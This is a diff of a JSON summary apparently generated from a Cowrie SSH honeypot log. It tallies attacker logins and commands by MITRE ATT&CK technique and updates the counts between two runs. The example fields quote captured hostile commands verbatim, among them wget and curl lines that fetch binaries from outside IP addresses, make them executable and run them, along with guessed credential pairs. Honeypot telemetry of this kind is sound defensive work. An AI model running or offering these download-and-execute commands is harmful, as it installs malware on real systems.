@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-04 16:03:58",
+  "generated": "2026-09-04 17:04:20",
   "totals": {
-    "commands": 432,
-    "login_failed": 1624,
-    "login_success": 173,
-    "sessions": 1756
+    "commands": 555,
+    "login_failed": 1722,
+    "login_success": 210,
+    "sessions": 1848
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1624,
+      "count": 1722,
       "examples": [
         "root / abcd12345",
         "admin / yess",
@@ -21,14 +21,14 @@
         "root / Arian"
       ],
       "first": "2026-09-04T00:00:06.722859Z",
-      "last": "2026-09-04T16:01:08.143223Z",
-      "unique_ips": 201
+      "last": "2026-09-04T17:02:57.806763Z",
+      "unique_ips": 218
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 173,
+      "count": 210,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "support / letmein",
@@ -37,14 +37,14 @@
         "root / "
       ],
       "first": "2026-09-04T00:10:27.211479Z",
-      "last": "2026-09-04T15:53:14.596742Z",
-      "unique_ips": 88
+      "last": "2026-09-04T16:57:49.246557Z",
+      "unique_ips": 94
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 40,
+      "count": 55,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-04T00:25:16.590506Z",
-      "last": "2026-09-04T15:05:26.275143Z",
-      "unique_ips": 8
+      "last": "2026-09-04T16:35:39.653883Z",
+      "unique_ips": 9
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 14,
+      "count": 18,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,8 +69,8 @@
         "nohup $SHELL -c \"curl http://120.26.66.176:8796/linux -o /tmp/jyv7FUoQeO; if [ ! -f /tmp/jyv7FUoQeO ]; then wget http://"
       ],
       "first": "2026-09-04T00:25:18.578399Z",
-      "last": "2026-09-04T15:05:26.270619Z",
-      "unique_ips": 5
+      "last": "2026-09-04T16:35:39.653883Z",
+      "unique_ips": 6
     },
     {
       "id": "T1082",
@@ -92,15 +92,15 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 5,
+      "count": 6,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "id"
       ],
       "first": "2026-09-04T00:25:18.578399Z",
-      "last": "2026-09-04T12:22:17.626466Z",
-      "unique_ips": 5
+      "last": "2026-09-04T16:35:02.878063Z",
+      "unique_ips": 6
     },
     {
       "id": "T1059.004",
@@ -204,35 +204,39 @@
   "unmapped": [
     [
       "system",
-      85
+      116
     ],
     [
       "shell",
-      85
+      116
     ],
     [
       "sh",
-      85
+      116
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      16
     ],
     [
       "/bin/busybox UNSTABLE",
       8
     ],
     [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      "enable",
       8
     ],
     [
-      "enable",
-      7
-    ],
-    [
       "/bin/busybox",
-      7
+      8
     ],
     [
       "linuxshell",
-      6
+      7
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      4
     ],
     [
       ">/tmp/.codi && cd /tmp/",
@@ -276,10 +280,6 @@
     ],
     [
       ">/etc/.codi && cd /etc/",
-      4
-    ],
-    [
-      ">/boot/.codi && cd /boot/",
       4
     ]
   ]
